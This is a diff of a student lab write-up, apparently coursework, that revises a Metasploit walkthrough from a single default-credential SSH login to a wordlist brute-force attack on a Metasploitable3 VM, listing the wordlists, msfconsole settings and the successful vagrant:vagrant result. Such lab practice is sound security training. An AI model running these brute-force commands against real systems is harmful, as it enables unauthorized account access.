@@ -1,52 +1,94 @@
-# Metasploit – SSH Brute-Force
+# Metasploit – SSH Brute-Force Attack
 
-This part explains how we used Metasploit to perform an SSH login attempt on Metasploitable3 using default credentials.
+This section shows how we performed a **real brute-force attack** on the SSH service of Metasploitable3 using Metasploit.
+
+---
 
 ## Target Info
 
 - IP Address: 172.28.128.3
 - Port: 22
-- Username: msfadmin
-- Password: msfadmin
+- Service: SSH
+- Goal: Discover valid credentials using brute-force.
+
+---
 
 ## What We Did
 
-We used Metasploit’s `ssh_login` scanner module to test if we could log in to the SSH service on the target machine using known credentials. The goal was to simulate a basic brute-force attack with a single user/pass combo.
+We used Metasploit’s `ssh_login` scanner module to perform a brute-force attack. Instead of trying a single username/password, we created **wordlists** with multiple usernames and passwords. Metasploit automatically tried all combinations until it found valid login credentials.
+
+---
+
+## Wordlists Used
+
+**users.txt**
+
+```
+admin
+msfadmin
+root
+vagrant
+test
+```
+
+**pass.txt**
+
+```
+password
+123456
+msfadmin
+vagrant
+admin123
+```
+
+---
 
 ## Steps
 
-Start Metasploit by running the following command in the terminal:
+1. Start Metasploit:
 
 ```bash
 msfconsole
 ```
 
-Once it loads, use the SSH login module:
+2. Load the SSH login scanner module:
 
 ```bash
 use auxiliary/scanner/ssh/ssh_login
 ```
 
-Set the target IP and credentials:
+3. Set up the target and wordlists:
 
 ```bash
 set RHOSTS 172.28.128.3
-set USERNAME msfadmin
-set PASSWORD msfadmin
+set USER_FILE /home/kali/users.txt
+set PASS_FILE /home/kali/pass.txt
+set BRUTEFORCE_SPEED 5
+set THREADS 4
+set VERBOSE true
+set STOP_ON_SUCCESS true
 run
 ```
 
+---
+
 ## Result
 
-The login was successful. This confirms that the target SSH service was accessible using default credentials.
+Metasploit tried multiple combinations and found valid credentials:
 
-```text
-[+] 172.28.128.3:22 - Login Successful: msfadmin:msfadmin
 ```
+[+] 172.28.128.3:22 - Login Successful: vagrant:vagrant
+```
+
+This confirms the SSH service was vulnerable to brute-force attacks using weak credentials.
+
+---
 
 ## Screenshot
 
-We took a screenshot showing the successful login result from Metasploit.  
+A screenshot showing the brute-force attempts and the successful login result was captured.  
 The file is saved as: `metasploit_attack.png`
+
+---
 
 This completes Task 1.1 for Phase 1.
